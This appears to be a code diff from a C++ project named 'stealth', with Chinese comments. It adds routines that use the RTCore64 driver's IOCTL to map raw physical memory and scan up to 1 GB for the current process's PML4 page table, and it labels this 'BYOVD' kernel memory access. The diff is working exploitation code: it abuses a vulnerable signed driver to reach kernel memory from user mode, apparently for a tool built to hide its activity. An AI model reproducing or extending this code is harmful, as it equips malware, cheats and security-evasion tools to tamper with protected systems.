@@ -71,18 +71,130 @@ namespace stealth {
 std::vector<ProtectedUserRegion> g_protectedUserRegions;
 
 // ============================================================
-// CR3 读取 (兼容 MSVC 和 MinGW/g++)
-// MSVC x64: 不支持内联汇编, 使用 __readcr3() intrinsic
-// MinGW/g++: 支持内联汇编, 也可用 __builtin_ia32_readcr3()
+// PML4 物理地址获取 — 通过 IOCTL 扫描物理内存
+//
+// ★ v3.84: mov cr3 是特权指令, 在用户态(Ring 3)执行会触发
+//   STATUS_PRIVILEGED_INSTRUCTION (0xC0000096) → #GP(0)。
+//   改为通过 RTCore64 IOCTL 直接映射物理内存,
+//   扫描寻找当前进程的 PML4 表并缓存其物理地址。
+//
+//   原理: PML4 表是一个 4KB 页, 包含 512 个 uint64 表项。
+//   内核半区 (entry 256-511) 在所有进程中共享相同的物理 PDPT 指向,
+//   因此可通过验证内核 PML4E → PDPTE 链来确定 PML4 身份。
 // ============================================================
-static uint64_t ReadCR3() {
-#ifdef _MSC_VER
-    return __readcr3();
-#else
-    uint64_t cr3;
-    __asm__ volatile("mov %%cr3, %0" : "=r"(cr3));
-    return cr3;
-#endif
+
+// ★ ReadCR3 不能是 static — 需要在 byovd_kernel.h 中 friend 声明
+
+// 轻量物理映射: 仅 IOCTL, 无日志/缓存/overlap 检查
+static bool MapPhysicalRaw(HANDLE hDevice, uint32_t ioctlCode,
+                           uint64_t physAddr, uint8_t** outVirtAddr) {
+    struct { uint64_t physAddr; uint32_t size; uint32_t flags; } request;
+    request.physAddr = physAddr;
+    request.size     = 0x1000; // 单页
+    request.flags    = 0;
+
+    union { uint8_t raw[256]; uint8_t* mappedPtr; } outBuf;
+    outBuf.mappedPtr = nullptr;
+    DWORD bytesRet = 0;
+
+    BOOL ok = DeviceIoControl(hDevice, ioctlCode,
+                              &request, sizeof(request),
+                              outBuf.raw, sizeof(outBuf.raw),
+                              &bytesRet, nullptr);
+    if (ok && outBuf.mappedPtr) {
+        *outVirtAddr = outBuf.mappedPtr;
+        return true;
+    }
+    return false;
+}
+
+// 检查一个物理页是否为当前进程的 PML4 表
+static bool IsValidPML4(HANDLE hDevice, uint32_t ioctlCode,
+                        uint64_t physAddr, uint64_t* pml4Entries) {
+    // 映射候选 PML4 页
+    uint8_t* mapped = nullptr;
+    if (!MapPhysicalRaw(hDevice, ioctlCode, physAddr, &mapped))
+        return false;
+
+    memcpy(pml4Entries, mapped, 0x1000);
+    uint64_t* entries = pml4Entries;
+
+    // 验证: 内核半区 (entry 256-511) 需要大部分 Present
+    int kernelPresent = 0;
+    for (int i = 256; i < 512; i++) {
+        if (entries[i] & 1) kernelPresent++;
+    }
+    if (kernelPresent < 200) return false; // 至少 200 个内核条目
+
+    // 验证: 抽查一个内核 PDPT — entry 0x1F0~0x1FF 是高内核地址区域
+    for (int i = 490; i < 512; i++) {
+        if (!(entries[i] & 1)) continue;
+        uint64_t pdptPhys = entries[i] & 0x0000FFFFFFFFF000ULL;
+
+        uint8_t* pdptMapped = nullptr;
+        if (!MapPhysicalRaw(hDevice, ioctlCode, pdptPhys, &pdptMapped))
+            continue;
+
+        // 读取 PDPT, 检查其内核半区是否也有 Present 条目
+        uint64_t pdptEntries[512];
+        memcpy(pdptEntries, pdptMapped, 0x1000);
+
+        int pdptKernel = 0;
+        for (int j = 256; j < 512; j++) {
+            if (pdptEntries[j] & 1) pdptKernel++;
+        }
+        if (pdptKernel > 100) return true; // 有效 PDPT → 确认为 PML4
+    }
+    return false;
+}
+
+// 通过 IOCTL 扫描物理内存寻找 PML4 表物理地址
+static uint64_t FindPML4Physical(HANDLE hDevice, uint32_t ioctlCode) {
+    // PML4 通常在低物理地址 (非分页池 → 前 2GB)
+    // 扫描策略: 先快速扫前 64MB, 未找到则扩展到 1GB
+    uint64_t pml4Entries[512]; // 栈上缓冲区
+
+    // 第1轮: 前 64MB (16K 页), 步进 0x1000
+    for (uint64_t phys = 0x1000; phys < 0x4000000; phys += 0x1000) {
+        if (IsValidPML4(hDevice, ioctlCode, phys, pml4Entries)) {
+            ByovdDiag("BYOVD:FindPML4: found at phys=0x%llX "
+                      "(scanned %llu pages)\n",
+                      (unsigned long long)phys,
+                      (unsigned long long)(phys >> 12));
+            return phys;
+        }
+    }
+
+    // 第2轮: 扩展到 1GB
+    for (uint64_t phys = 0x4000000; phys < 0x40000000; phys += 0x1000) {
+        if (IsValidPML4(hDevice, ioctlCode, phys, pml4Entries)) {
+            ByovdDiag("BYOVD:FindPML4: found at phys=0x%llX "
+                      "(extended scan)\n",
+                      (unsigned long long)phys);
+            return phys;
+        }
+    }
+
+    return 0;
+}
+
+// 获取 PML4 物理地址 (懒初始化 + 缓存)
+// ★ 不能是 static: byovd_kernel.h 需要 friend 声明
+uint64_t ReadCR3() {
+    static uint64_t s_cachedPML4 = 0;
+    if (s_cachedPML4) return s_cachedPML4;
+
+    auto& kma = KernelMemoryAccessor::Instance();
+    // 注意: 此时 m_active=true, m_hDevice 有效 (Initialize 中调用)
+
+    // ★ v3.84: 通过 IOCTL 扫描物理内存获取 PML4, 避免特权指令 crash
+    //   ReadPhysical(0x1000, ...) 会走 MapPhysical → IOCTL → 映射成功即可读
+    //   但更直接的方式: 用 raw IOCTL 扫描
+    s_cachedPML4 = FindPML4Physical(kma.m_hDevice, kma.m_driverInfo.ioctlCode);
+
+    ByovdDiag("BYOVD:ReadCR3: PML4 phys=0x%llX\n",
+              (unsigned long long)s_cachedPML4);
+    return s_cachedPML4;
 }
 
 // ============================================================
